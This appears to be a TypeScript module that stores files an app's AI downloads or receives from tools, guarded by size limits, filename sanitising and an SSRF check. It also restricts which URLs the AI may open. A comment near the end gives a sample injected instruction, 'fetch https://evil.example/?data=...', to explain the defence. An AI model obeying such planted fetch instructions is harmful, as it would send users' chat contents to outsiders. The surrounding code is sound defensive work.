import { FILE_STORE_LIMITS as L, linkHandle } from "@mc/shared";
import { randomBytes } from "node:crypto";
import { projectPrefix } from "./file-paths.ts";
import { objectStore, type ObjectStore } from "./r2.ts";
import { BlockedAddress, createGuardedFetch } from "./ssrf.ts";

// Files a project's AI brings in from elsewhere: a download link (any https address) or the files a connected tool returns
// (pictures, binary resources). They are kept in R2 under attachments/<project>/<id>-<name>, apart from the shared folder
// (those are the host's own files and stay read only). Nothing here talks to a particular service: ClickUp, Drive, a plain
// web address and an MCP tool all end up in `save`.
//
// What comes in is untrusted: only an https address on a public network (ssrf.ts), no cookies or login sent, a size limit,
// and the bytes are stored as a download and never served as a page. The AI reads them as data (attachment-tools.ts).

export const ATTACHMENT_LIMITS = {
  fileBytes: L.fileBytes,
  projectBytes: L.projectBytes,
  /** Attachments one project keeps. */
  projectFiles: 2_000,
  /** Attachments listed at once. */
  listMax: 200,
  fetchMs: 60_000,
} as const;

export type AttachmentErrorCode = "off" | "too_large" | "full" | "bad_link" | "failed" | "not_found" | "empty";

export class AttachmentError extends Error {
  constructor(
    readonly code: AttachmentErrorCode,
    message: string,
  ) {
    super(message);
  }
}

export type Attachment = { id: string; name: string; bytes: number; savedAt: string | null };

const ID = /^[0-9a-f]{12}$/;
// eslint-disable-next-line no-control-regex
const BAD_CHARS = /[\u{0}-\u{1f}\u{7f}-\u{9f}\u{2028}\u{2029}\u{200b}-\u{200f}\u{202a}-\u{202e}\u{2060}-\u{2069}\u{feff}"\\/:*?<>|]/gu;

/** A name that is safe in a key and in a header: only a last path part, no control or direction characters, never empty. */
export function attachmentName(input: string): string {
  const last = input.split(/[\\/]/).pop() ?? "";
  const cleaned = last.replace(BAD_CHARS, "_").replace(/^[.\s]+/, "").replace(/[.\s]+$/, "").trim();
  const dot = cleaned.lastIndexOf(".");
  const ext = dot > 0 ? cleaned.slice(dot, dot + 21) : "";
  const clipped = cleaned.length > 120 ? `${cleaned.slice(0, 100)}${ext}` : cleaned;
  return clipped || "file";
}

/** The name the server of a download suggests: Content-Disposition first, else the last part of the address. */
export function nameFromDownload(headers: Headers, url: URL): string {
  const cd = headers.get("content-disposition") ?? "";
  const star = cd.match(/filename\*\s*=\s*(?:UTF-8|utf-8)''([^;]+)/);
  const plain = cd.match(/filename\s*=\s*"?([^";]+)"?/);
  const raw = star?.[1] ?? plain?.[1] ?? url.pathname.split("/").pop() ?? "";
  try {
    return attachmentName(decodeURIComponent(raw));
  } catch {
    return attachmentName(raw);
  }
}

const prefixOf = (projectId: string) => `attachments/${projectPrefix(projectId).slice("projects/".length)}`;
const keyOf = (projectId: string, id: string, name: string) => `${prefixOf(projectId)}${id}-${name}`;

function parse(prefix: string, key: string, bytes: number, modified: string | null): Attachment | null {
  const rest = key.startsWith(prefix) ? key.slice(prefix.length) : "";
  const id = rest.slice(0, 12);
  if (!ID.test(id) || rest[12] !== "-") return null;
  return { id, name: rest.slice(13), bytes, savedAt: modified };
}

export type AttachmentDeps = {
  store?: () => ObjectStore;
  /** Tests only: the network. */
  fetchFile?: typeof fetch;
};

/** The body of a response, read to the end, at most `max` bytes. */
async function readBody(res: Response, max: number): Promise<Uint8Array> {
  const declared = Number(res.headers.get("content-length") ?? 0);
  if (declared > max) throw new AttachmentError("too_large", `That file is larger than ${Math.round(max / 1024 / 1024)} MB.`);
  if (!res.body) return new Uint8Array();
  const chunks: Uint8Array[] = [];
  let total = 0;
  const reader = res.body.getReader();
  for (;;) {
    const { done, value } = await reader.read();
    if (done) break;
    total += value.byteLength;
    if (total > max) {
      void reader.cancel().catch(() => undefined);
      throw new AttachmentError("too_large", `That file is larger than ${Math.round(max / 1024 / 1024)} MB.`);
    }
    chunks.push(value);
  }
  const out = new Uint8Array(total);
  let at = 0;
  for (const c of chunks) {
    out.set(c, at);
    at += c.byteLength;
  }
  return out;
}

export function createAttachments(deps: AttachmentDeps = {}) {
  const store = deps.store ?? objectStore;
  // A response over the file limit stops the read at once; the extra byte lets `readBody` tell "too large" from "exactly the limit".
  const download = deps.fetchFile ?? createGuardedFetch({ maxBodyBytes: ATTACHMENT_LIMITS.fileBytes + 1 });

  return {
    /** Keeps `bytes` as a new attachment of the project. */
    async save(projectId: string, by: string, file: { name: string; bytes: Uint8Array; source: string }): Promise<Attachment> {
      if (file.bytes.byteLength === 0) throw new AttachmentError("empty", "That file is empty.");
      if (file.bytes.byteLength > ATTACHMENT_LIMITS.fileBytes) throw new AttachmentError("too_large", `That file is larger than ${Math.round(ATTACHMENT_LIMITS.fileBytes / 1024 / 1024)} MB.`);
      const s = store();
      const prefix = prefixOf(projectId);
      const used = await s.usage(prefix, ATTACHMENT_LIMITS.projectFiles);
      if (!used || used.bytes + file.bytes.byteLength > ATTACHMENT_LIMITS.projectBytes) throw new AttachmentError("full", "This project's saved attachments are full. Ask someone to remove some.");
      const name = attachmentName(file.name);
      const id = randomBytes(6).toString("hex");
      // R2 metadata is ASCII only; both values are cut and escaped.
      await s.put(keyOf(projectId, id, name), file.bytes, { by: encodeURIComponent(by).slice(0, 80), source: encodeURIComponent(file.source).slice(0, 200) });
      return { id, name, bytes: file.bytes.byteLength, savedAt: new Date().toISOString() };
    },

    /** Downloads `link` now (so a one-use address is spent here and only here) and keeps it. `link` was checked by the caller. */
    async fromLink(projectId: string, by: string, link: string, nameHint?: string): Promise<Attachment> {
      let url: URL;
      try {
        url = new URL(link);
      } catch {
        throw new AttachmentError("bad_link", "That is not a web address.");
      }
      let res: Response;
      try {
        res = await download(url.href, { method: "GET", headers: { accept: "*/*", "user-agent": "Nido-file-fetch" }, signal: AbortSignal.timeout(ATTACHMENT_LIMITS.fetchMs) });
      } catch (e) {
        if (e instanceof BlockedAddress) throw new AttachmentError("bad_link", "That address can't be opened (only public https addresses are allowed).");
        // Never log the address: it can hold a token. The host is enough to debug with.
        console.error("[attachments] download failed from", url.host, e instanceof Error ? e.name : "error");
        throw new AttachmentError("failed", "The download did not work (no answer, or the address was refused).");
      }
      if (!res.ok) {
        void res.body?.cancel().catch(() => undefined);
        console.error("[attachments] download refused by", url.host, res.status);
        throw new AttachmentError("failed", `The site answered ${res.status}. A one-use or expired link has to be requested again from the tool that gave it.`);
      }
      let bytes: Uint8Array;
      try {
        bytes = await readBody(res, ATTACHMENT_LIMITS.fileBytes);
      } catch (e) {
        if (e instanceof AttachmentError) throw e;
        if (e instanceof Error && /too large/.test(e.message)) throw new AttachmentError("too_large", `That file is larger than ${Math.round(ATTACHMENT_LIMITS.fileBytes / 1024 / 1024)} MB.`);
        console.error("[attachments] download broke off from", url.host, e instanceof Error ? e.name : "error");
        throw new AttachmentError("failed", "The download broke off.");
      }
      return this.save(projectId, by, { name: nameHint?.trim() ? nameHint : nameFromDownload(res.headers, url), bytes, source: url.origin });
    },

    async list(projectId: string): Promise<Attachment[]> {
      const prefix = prefixOf(projectId);
      const r = await store().list(prefix, ATTACHMENT_LIMITS.listMax);
      return r.files
        .flatMap((f) => parse(prefix, f.key, f.bytes, f.modified) ?? [])
        .sort((a, b) => (b.savedAt ?? "").localeCompare(a.savedAt ?? ""));
    },

    async read(projectId: string, id: string): Promise<{ attachment: Attachment; bytes: Uint8Array }> {
      if (!ID.test(id)) throw new AttachmentError("not_found", "There is no attachment with that id. Use attachment_list.");
      const s = store();
      const prefix = prefixOf(projectId);
      const found = (await s.list(`${prefix}${id}-`, 2)).files[0];
      const attachment = found ? parse(prefix, found.key, found.bytes, found.modified) : null;
      if (!found || !attachment) throw new AttachmentError("not_found", "There is no attachment with that id. Use attachment_list.");
      const bytes = await s.get(found.key, ATTACHMENT_LIMITS.fileBytes);
      if (!bytes) throw new AttachmentError("not_found", "There is no attachment with that id. Use attachment_list.");
      return { attachment, bytes };
    },
  };
}

export type Attachments = ReturnType<typeof createAttachments>;

/** The key prefix of everything a project keeps (for removing it with the project). */
export const attachmentPrefix = prefixOf;

// ---- Which addresses the AI may open. It may not invent or build one: an address has to be one it was handed. That keeps a
// page or tool result that says "fetch https://evil.example/?data=..." from turning the AI into a way to send chat text out,
// because the only addresses it can open are ones that already stand, whole, in a person's message or in a tool's answer.

const URL_IN_TEXT = /https:\/\/[^\s"'<>\\\])}]+/g;
const HANDLE = /^\[?link:([0-9a-f]{8})(?:\s[^\]]*)?\]?$/i;

export type LinkBook = {
  /** Addresses a tool returned, whole (the server's own list, which still has any token in it). */
  addResult(links: string[] | undefined): void;
  /** Addresses that stand in this text: a person's message, or what a tool printed. */
  addText(text: string): void;
  /** The address an input names (the address itself, or "link:<id>"), or null when the AI was not handed it. */
  resolve(input: string): string | null;
};

export function createLinkBook(): LinkBook {
  const known = new Set<string>();
  const byHandle = new Map<string, string>();
  const add = (url: string) => {
    if (known.size >= 500 || url.length > 4_000) return;
    known.add(url);
    byHandle.set(linkHandle(url), url);
  };
  return {
    addResult(links) {
      for (const l of links ?? []) add(l);
    },
    addText(text) {
      for (const m of text.matchAll(URL_IN_TEXT)) add(m[0].replace(/[.,;:!?]+$/, ""));
    },
    resolve(input) {
      const t = input.trim();
      const h = t.match(HANDLE);
      if (h) return byHandle.get(h[1]!.toLowerCase()) ?? null;
      const clean = t.replace(/[.,;:!?]+$/, "");
      return known.has(clean) ? clean : null;
    },
  };
}
